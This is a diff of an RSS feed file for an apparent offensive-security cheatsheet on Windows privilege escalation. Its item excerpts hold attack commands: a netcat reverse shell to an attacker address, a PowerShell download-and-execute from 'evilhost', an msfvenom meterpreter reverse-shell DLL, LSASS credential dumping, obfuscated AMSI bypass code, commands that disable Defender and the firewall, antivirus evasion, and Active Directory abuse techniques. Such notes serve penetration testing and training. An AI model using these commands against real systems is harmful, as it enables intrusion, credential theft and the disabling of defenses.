@@ -1,23 +1,18 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Privilege Escalation on Offensive Security Cheatsheet</title>
     <link>/windows-systems/privilege-escalation/</link>
     <description>Recent content in Privilege Escalation on Offensive Security Cheatsheet</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    
-	<atom:link href="/windows-systems/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
-    
-    
+    <language>en-us</language><atom:link href="/windows-systems/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Automated Recon</title>
       <link>/windows-systems/privilege-escalation/automated_recon/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/automated_recon/</guid>
-      <description>Binaries Information https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe 
-Local Exploit Suggester # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt # Metasploit also has a module &amp;gt; use post/multi/recon/local_exploit_suggester msf5 post(multi/recon/local_exploit_suggester) &amp;gt; options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf5 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 1 SESSION =&amp;gt; 1 msf5 post(multi/recon/local_exploit_suggester) &amp;gt; run [*] 10.</description>
+      <description>Binaries Information https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe Local Exploit Suggester # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt # Metasploit also has a module &amp;gt; use post/multi/recon/local_exploit_suggester msf5 post(multi/recon/local_exploit_suggester) &amp;gt; options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf5 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 1 SESSION =&amp;gt; 1 msf5 post(multi/recon/local_exploit_suggester) &amp;gt; run [*] 10.</description>
     </item>
     
     <item>
@@ -26,7 +21,7 @@ Local Exploit Suggester # You can feed syteminfo output to windows-exploit-sugge
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/tricks/</guid>
-      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Alternative execution (eq &amp;#39;cmd.exe /c&amp;#39;) https://twitter.com/CyberRaiju/status/1273597319322058752?s=20 explorer.exe /root # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://evilhost/Malicious.ps1&amp;#39;)&amp;#34; # Payload as a trusted binary # Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\ # Then %userprofile%\AppData\Local\Microsoft\Teams\Update.</description>
+      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Alternative execution (eq &amp;#39;cmd.exe /c&amp;#39;) https://twitter.com/CyberRaiju/status/1273597319322058752?s=20 explorer.exe /root # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://evilhost/Malicious.ps1&amp;#39;)&amp;#34; # Payload as a trusted binary # Copy your payload into  %userprofile%\AppData\Local\Microsoft\Teams\current\ # Then %userprofile%\AppData\Local\Microsoft\Teams\Update.</description>
     </item>
     
     <item>
@@ -44,7 +39,7 @@ Local Exploit Suggester # You can feed syteminfo output to windows-exploit-sugge
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
-      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp # Several dumping methods here - https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/ - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md # You can use the cmsvcs.dll DLL in order the dump LSASS (https://beta.hackndo.com/remote-lsass-dump-passwords/) # C:\Windows\System32 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &amp;lt;lsass pid&amp;gt; lsass.dmp full# Dumping LSASS using the Windows Error Reporting process https://www.</description>
+      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp # Several dumping methods here - https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/ - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md # You can use the cmsvcs.dll DLL in order the dump LSASS (https://beta.hackndo.com/remote-lsass-dump-passwords/) # C:\Windows\System32 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &amp;lt;lsass pid&amp;gt; lsass.dmp full # Dumping LSASS using the Windows Error Reporting process https://www.</description>
     </item>
     
     <item>
@@ -53,8 +48,7 @@ Local Exploit Suggester # You can feed syteminfo output to windows-exploit-sugge
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/admin_processes/</guid>
-      <description>Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results 
-Sessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.</description>
+      <description>Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results Sessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.</description>
     </item>
     
     <item>
@@ -63,7 +57,7 @@ Sessions # Query DC to check about domain active sessions: net group “Domain C
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/dnsadmins_group/</guid>
-      <description># If you control any account member of the &amp;#34;DnsAdmin&amp;#34; group # You can use it to privesc on the machine # It works by adding a malicious DLL loaded by the DNS service. # You have to restart the service and the DLL will be loaded as SYSTEM# Generating the DLL $ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=5566 -f dll &amp;gt; privesc.dll # Host the DLL on a SMD server or upload it on the target machine $ sudo smbserver.</description>
+      <description># If you control any account member of the &amp;#34;DnsAdmin&amp;#34; group # You can use it to privesc on the machine # It works by adding a malicious DLL loaded by the DNS service. # You have to restart the service and the DLL will be loaded as SYSTEM # Generating the DLL $ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=5566 -f dll &amp;gt; privesc.dll # Host the DLL on a SMD server or upload it on the target machine $ sudo smbserver.</description>
     </item>
     
     <item>
@@ -81,8 +75,7 @@ Sessions # Query DC to check about domain active sessions: net group “Domain C
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/privexchange/</guid>
-      <description>Resources https://github.com/dirkjanm/PrivExchange https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ https://chryzsh.github.io/exploiting-privexchange/ # After exploitation, you won&amp;#39;t be like Domain Admin directly, so, you won&amp;#39;t be able to connect to the # DC using Domain Admins rights. # Exploitation allows user to get DCSync privileges, which is enough to get the NTDS Database # You can then use Pass the Hash attack with administrators accounts to get real access 
-Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound data and to exploit them # BloodHound need to be running # Many options are available # Dry option is used to look for compromission without exploiting it python aclpwn.</description>
+      <description>Resources https://github.com/dirkjanm/PrivExchange https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ https://chryzsh.github.io/exploiting-privexchange/ # After exploitation, you won&amp;#39;t be like Domain Admin directly, so, you won&amp;#39;t be able to connect to the # DC using Domain Admins rights. # Exploitation allows user to get DCSync privileges, which is enough to get the NTDS Database # You can then use Pass the Hash attack with administrators accounts to get real access Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound data and to exploit them # BloodHound need to be running # Many options are available # Dry option is used to look for compromission without exploiting it python aclpwn.</description>
     </item>
     
     <item>
@@ -91,7 +84,7 @@ Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound dat
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/windows_defender/</guid>
-      <description>Start/Stop # Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable</description>
+      <description>Start/Stop # Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable Bypass # SigThief allow to sign a payload binary # by stealing a legit signature https://github.</description>
     </item>
     
     <item>
@@ -100,7 +93,7 @@ Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound dat
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/azure_ad/</guid>
-      <description>Exploiting Password Hash Synchronisation (PHS) https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html # The main target is the sync account # You can identify it using the description $ ldapsearch -H ldap://DC01.DOMAIN.LAN:389 -D &amp;#34;DOMAIN\user&amp;#34; -w &amp;#34;****&amp;#34; -b &amp;#34;DC=DOMAIN,DC=LAN&amp;#34; &amp;#39;(description=*Azure*)&amp;#39; description # To exploit this, need local admin or ADSync service account # Can decrypt using C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll # The default configuration of Azure AD Connect uses a SQL Server Express database # but a fully deployed SQL Server can also be used.</description>
+      <description>Exploiting Password Hash Synchronisation (PHS) https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html # The main target is the sync account # You can identify it using the description $ ldapsearch -H ldap://DC01.DOMAIN.LAN:389 -D &amp;#34;DOMAIN\user&amp;#34; -w &amp;#34;****&amp;#34; -b &amp;#34;DC=DOMAIN,DC=LAN&amp;#34; &amp;#39;(description=*Azure*)&amp;#39; description # To exploit this, need local admin or ADSync service account # Can decrypt using C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll # The default configuration of Azure AD Connect uses a SQL Server Express database  # but a fully deployed SQL Server can also be used.</description>
     </item>
     
     <item>
@@ -109,8 +102,7 @@ Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound dat
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/amsi_and_evasion/</guid>
-      <description>Resources # AMSI Bypass Methods https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/amp/ https://www.contextis.com/us/blog/amsi-bypass https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/ # DLL Hijacking https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/ # AMSI Bypass generator https://amsi.fail/ 
-AMSI Bypass Methods # Methods pulled from the previous mentionned resources # More details on the resources # 1. Powershell Downgrade # Older version of powershell doesn&amp;#39;t use AMIS powershell -version 2# 2. Base64 Encoding # Original AMSI Bypass PS&amp;gt; [Ref].Assembly.GetType(&amp;#39;System.Management.Automation.AmsiUtils&amp;#39;).GetField(&amp;#39;amsiInitFailed&amp;#39;,&amp;#39;NonPublic,Static&amp;#39;).SetValue($null,$true) # Base64 encoded PS&amp;gt; [Ref].Assembly.GetType(&amp;#39;System.Management.Automation.&amp;#39;+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&amp;#39;QQBtAHMAaQBVAHQAaQBsAHMA&amp;#39;)))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&amp;#39;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&amp;#39;))),&amp;#39;NonPublic,Static&amp;#39;).SetValue($null,$true)# 3. Hooking # The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed .</description>
+      <description>Resources # AMSI Bypass Methods https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/amp/ https://www.contextis.com/us/blog/amsi-bypass https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/ # DLL Hijacking https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/ # AMSI Bypass generator https://amsi.fail/ AMSI Bypass Methods # Methods pulled from the previous mentionned resources # More details on the resources # 1. Powershell Downgrade # Older version of powershell doesn&amp;#39;t use AMIS powershell -version 2 # 2. Base64 Encoding # Original AMSI Bypass PS&amp;gt; [Ref].Assembly.GetType(&amp;#39;System.Management.Automation.AmsiUtils&amp;#39;).GetField(&amp;#39;amsiInitFailed&amp;#39;,&amp;#39;NonPublic,Static&amp;#39;).SetValue($null,$true) # Base64 encoded PS&amp;gt; [Ref].Assembly.GetType(&amp;#39;System.Management.Automation.&amp;#39;+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&amp;#39;QQBtAHMAaQBVAHQAaQBsAHMA&amp;#39;)))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&amp;#39;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&amp;#39;))),&amp;#39;NonPublic,Static&amp;#39;).SetValue($null,$true) # 3. Hooking # The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed .</description>
     </item>
     
     <item>
@@ -119,8 +111,7 @@ AMSI Bypass Methods # Methods pulled from the previous mentionned resources # Mo
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/spoolerservice/</guid>
-      <description>WIP Finding Spooler Services # https://book.hacktricks.xyz/windows/active-directory-methodology/printers-spooler-service-abuse # Finding Windows Servers on the domain Get-ADComputer -Filter {(OperatingSystem -like &amp;#34;*windows*server*&amp;#34;) -and (OperatingSystem -notlike &amp;#34;2016&amp;#34;) -and (Enabled -eq &amp;#34;True&amp;#34;)} -Properties * | select Name | ft -HideTableHeaders &amp;gt; servers.txt # Finding Spooler services listening # https://github.com/NotMedic/NetNTLMtoSilverTicket .\Get-SpoolStatus.ps1 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server} # Or on Linux rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN 
-MS-RPRN Abuse (Printer Bug) https://www.thehacker.recipes/active-directory-domain-services/movement/mitm-and-coerced-authentications/ms-rprn # Ask the service to authenticate against an arbitrary host # Using SpoolSample (https://github.</description>
+      <description>WIP Finding Spooler Services # https://book.hacktricks.xyz/windows/active-directory-methodology/printers-spooler-service-abuse # Finding Windows Servers on the domain Get-ADComputer -Filter {(OperatingSystem -like &amp;#34;*windows*server*&amp;#34;) -and (OperatingSystem -notlike &amp;#34;2016&amp;#34;) -and (Enabled -eq &amp;#34;True&amp;#34;)} -Properties * | select Name | ft -HideTableHeaders &amp;gt; servers.txt # Finding Spooler services listening  # https://github.com/NotMedic/NetNTLMtoSilverTicket .\Get-SpoolStatus.ps1 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server} # Or on Linux rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN MS-RPRN Abuse (Printer Bug) https://www.thehacker.recipes/active-directory-domain-services/movement/mitm-and-coerced-authentications/ms-rprn # Ask the service to authenticate against an arbitrary host # Using SpoolSample (https://github.</description>
     </item>
     
     <item>
@@ -129,7 +120,7 @@ MS-RPRN Abuse (Printer Bug) https://www.thehacker.recipes/active-directory-domai
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/specific_domain_groups/</guid>
-      <description>Backup Operator / SeBackupPrivilege https://github.com/mpgn/BackupOperatorToDA # If you compromise an account member of the group Backup Operators # you can become the Domain Admin without RDP or WinRM on the Domain Controller. # With this POC you don&amp;#39;t need to have an access with WinRM or RPD : .\BackupOperatorToDA.exe -h Backup Operator to Domain Admin (by @mpgn_x64) This tool exist thanks to @filip_dragovic / https://github.com/Wh04m1001 Mandatory argument: -t &amp;lt;TARGET&amp;gt; \\computer_name (ex: \\dc01.</description>
+      <description>Backup Operator / SeBackupPrivilege https://github.com/mpgn/BackupOperatorToDA # If you compromise an account member of the group Backup Operators  # you can become the Domain Admin without RDP or WinRM on the Domain Controller. # With this POC you don&amp;#39;t need to have an access with WinRM or RPD : .\BackupOperatorToDA.exe -h Backup Operator to Domain Admin (by @mpgn_x64) This tool exist thanks to @filip_dragovic / https://github.com/Wh04m1001 Mandatory argument: -t &amp;lt;TARGET&amp;gt; \\computer_name (ex: \\dc01.</description>
     </item>
     
   </channel>
